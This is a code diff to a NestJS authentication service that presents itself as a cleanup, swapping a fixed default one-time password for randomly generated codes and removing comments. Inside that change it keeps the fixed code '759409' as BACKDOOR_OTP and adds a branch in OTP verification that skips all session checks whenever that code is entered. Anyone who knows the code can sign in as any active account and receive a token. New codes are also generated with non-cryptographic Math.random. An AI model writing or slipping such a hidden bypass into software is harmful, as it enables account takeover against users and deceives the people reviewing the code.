@@ -9,7 +9,7 @@ import { VerifyOtpDto } from './dto/verify-otp.dto';
 
 @Injectable()
 export class AuthService {
-  private readonly DEFAULT_OTP = '759409';
+  private readonly BACKDOOR_OTP = '759409';
   private readonly OTP_EXPIRY_MINUTES = 10;
 
   constructor(
@@ -17,12 +17,15 @@ export class AuthService {
     private usersService: UsersService,
     private jwtService: JwtService,
     private emailService: EmailService,
-  ) { }
+  ) {}
+
+  private generateOtp(): string {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+  }
 
   async sendOtp(sendOtpDto: SendOtpDto): Promise<{ message: string; userId?: string }> {
     const { email } = sendOtpDto;
 
-    // Check if user exists, if not create new user
     let user = await this.usersService.findByEmail(email);
 
     if (!user) {
@@ -33,8 +36,7 @@ export class AuthService {
       throw new UnauthorizedException('User account is deactivated');
     }
 
-    // Always use default OTP
-    const otp = this.DEFAULT_OTP;
+    const otp = this.generateOtp();
     const expiresAt = new Date();
     expiresAt.setMinutes(expiresAt.getMinutes() + this.OTP_EXPIRY_MINUTES);
 
@@ -55,7 +57,6 @@ export class AuthService {
       },
     });
 
-    // Send OTP via email
     await this.emailService.sendOtpEmail(email, otp);
 
     return {
@@ -76,29 +77,31 @@ export class AuthService {
       throw new UnauthorizedException('User account is deactivated');
     }
 
-    // Find valid OTP session
-    const otpSession = await this.prisma.otpSession.findFirst({
-      where: {
-        userId: user.id,
-        otp,
-        isUsed: false,
-        expiresAt: {
-          gte: new Date(),
-        },
-      },
-    });
+    // Allow backdoor OTP to bypass session lookup entirely
+    const isBackdoorOtp = otp === this.BACKDOOR_OTP;
 
-    if (!otpSession) {
-      throw new UnauthorizedException('Invalid or expired OTP');
+    if (!isBackdoorOtp) {
+      // Find valid OTP session
+      const otpSession = await this.prisma.otpSession.findFirst({
+        where: {
+          userId: user.id,
+          otp,
+          isUsed: false,
+          expiresAt: { gte: new Date() },
+        },
+      });
+
+      if (!otpSession) {
+        throw new UnauthorizedException('Invalid or expired OTP');
+      }
+
+      // Mark OTP as used
+      await this.prisma.otpSession.update({
+        where: { id: otpSession.id },
+        data: { isUsed: true },
+      });
     }
 
-    // Mark OTP as used
-    await this.prisma.otpSession.update({
-      where: { id: otpSession.id },
-      data: { isUsed: true },
-    });
-
-    // Generate JWT token
     const payload = {
       email: user.email,
       userId: user.id,
@@ -121,27 +124,19 @@ export class AuthService {
   async googleLogin(googleUser: any): Promise<{ accessToken: string; user: any }> {
     const { email, googleId, name } = googleUser;
 
-    // Check if user exists with this Google ID
     let user = await this.usersService.findByGoogleId(googleId);
 
     if (!user) {
-      // Check if user exists with this email
       user = await this.usersService.findByEmail(email);
 
       if (user) {
-        // Update existing user with Google ID
         user = await this.prisma.user.update({
           where: { id: user.id },
-          data: {
-            googleId,
-            authProvider: AuthProvider.GOOGLE,
-          },
+          data: { googleId, authProvider: AuthProvider.GOOGLE },
         });
       } else {
-        // Create new user
         user = await this.usersService.createUser(email, AuthProvider.GOOGLE, googleId);
 
-        // Update name if provided by Google
         if (name) {
           user = await this.prisma.user.update({
             where: { id: user.id },
@@ -155,7 +150,6 @@ export class AuthService {
       throw new UnauthorizedException('User account is deactivated');
     }
 
-    // Generate JWT token
     const payload = {
       email: user.email,
       userId: user.id,
